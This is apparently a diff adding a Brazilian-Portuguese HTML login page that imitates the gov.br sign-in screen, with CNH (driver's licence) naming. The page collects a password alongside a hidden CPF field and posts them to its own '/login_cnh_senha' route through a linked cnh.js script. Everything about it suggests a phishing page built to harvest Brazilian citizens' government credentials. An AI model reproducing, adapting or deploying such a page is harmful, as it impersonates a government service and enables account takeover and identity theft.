@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  
+  <!-- Fonte Roboto -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Ícone da aba -->
+  <link rel="icon" href="/staticcnh/favicon.png" type="image/png" />
+  <title>CDT</title>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      touch-action: manipulation;
+      overscroll-behavior: none;
+    }
+
+    /* Loader */
+    #loader {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #e6f6ff;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      color: #333;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      z-index: 999;
+      display: none; /* começa oculto */
+    }
+
+    .topbar {
+      background-color: #001F5C;
+      color: #fff;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .back-arrow {
+      font-size: 25px;
+      margin-right: 12px;
+      cursor: pointer;
+    }
+
+    .title {
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 24px;
+    }
+
+    .govbr-logo {
+      font-size: 35px;
+      font-weight: bold;
+      margin: 5px 0;
+      text-align: left;
+    }
+
+    .govbr-logo .g, .govbr-logo .b { color: #1351B4; }
+    .govbr-logo .o, .govbr-logo .r { color: #FFD700; }
+    .govbr-logo .v { color: #008000; }
+    .govbr-logo .dot { color: #1351B4; }
+
+    .subtitle {
+      font-size: 14px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 4px;
+    }
+
+    h6 {
+      font-weight: normal;
+      font-size: 12px;
+      margin: 0 0 8px 0;
+      display: block;
+      color: #555;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 16px;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background: #1351B4;
+      color: #fff;
+      border-radius: 6px;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .btn:hover { background: #0d3c8a; }
+
+    .desc {
+      font-size: 14px;
+      text-align: center;
+      margin-top: 12px;
+    }
+
+    .options {
+      margin-top: 32px;
+      font-size: 14px;
+    }
+
+    .options-title {
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+
+    .bank-login, .option {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      margin-bottom: 10px;
+    }
+
+    .icon { font-size: 16px; }
+    .icon.green { color: #2E7D32; }
+    .icon.blue { color: #1351B4; }
+
+    .badge {
+      background-color: #2E7D32;
+      color: white;
+      font-size: 10px;
+      font-weight: bold;
+      padding: 2px 6px;
+      border-radius: 4px;
+      margin-left: auto;
+      white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loader -->
+  <div id="loader">🔄 Atualizando...</div>
+
+  <div class="topbar">
+    <span class="back-arrow" onclick="history.back()">←</span>
+    <span class="title">ENTRAR COM GOV.BR</span>
+  </div>
+
+  <div class="container">
+    <div class="govbr-logo">
+      <span class="g">g</span><span class="o">o</span><span class="v">v</span><span class="dot">.</span><span class="b">b</span><span class="r">r</span>
+    </div>
+
+    <div class="subtitle">Identifique-se no gov.br com:</div>
+
+    <label for="senha">📇 Sua senha</label>
+    <h6>Digite sua senha para acessar sua conta gov.br</h6>
+    <label for="senha">Senha</label>
+    <input type="password" id="senha" placeholder="Digite sua senha" autocomplete="current-password" />
+
+    <!-- Redirecionamento seguro para WebView -->
+    <form method="POST" action="/login_cnh_senha">
+      <input type="hidden" name="cpf" value="{{ cpf }}">
+      <input type="hidden" name="senha" id="senhaHidden">
+      <button type="submit" class="btn">Entrar</button>
+    </form>
+
+    <div class="desc">Clique para criar ou acessar sua conta gov.br</div>
+
+    <div class="options">
+      <div class="options-title">Outras opções de identificação:</div>
+
+      <div class="bank-login">
+        <span class="icon green">💵</span>
+        <span class="text">Login com seu banco</span>
+        <span class="badge">SUA CONTA SERÁ PRATA</span>
+      </div>
+
+      <div class="option">
+        <span class="icon blue">📱</span>
+        <span class="text">Seu aplicativo gov.br</span>
+      </div>
+
+      <div class="option">
+        <span class="icon blue">🔒</span>
+        <span class="text">Seu certificado digital</span>
+      </div>
+
+      <div class="option">
+        <span class="icon blue">☁️</span>
+        <span class="text">Seu certificado em nuvem</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 🔥 IMPORTANTE: seu JS de login -->
+  <script src="cnh.js"></script>
+
+  <script>
+    let startY = 0;
+    let isRefreshing = false;
+
+    document.addEventListener('touchstart', e => {
+      if (window.scrollY === 0) {
+        startY = e.touches[0].clientY;
+      }
+    }, { passive: true });
+
+    document.addEventListener('touchend', e => {
+      const endY = e.changedTouches[0].clientY;
+      const deltaY = endY - startY;
+
+      if (deltaY > 80 && !isRefreshing && window.scrollY === 0) {
+        isRefreshing = true;
+        const loader = document.getElementById('loader');
+        loader.style.display = 'block';
+
+        setTimeout(() => {
+          location.reload();
+        }, 1000);
+      }
+    }, { passive: true });
+
+    document.querySelector("form").addEventListener("submit", e => {
+      e.preventDefault(); // impede o POST
+      entrarSenha(); // usa a função já existente no cnh.js
+    });
+  </script>
+</body>
+</html>
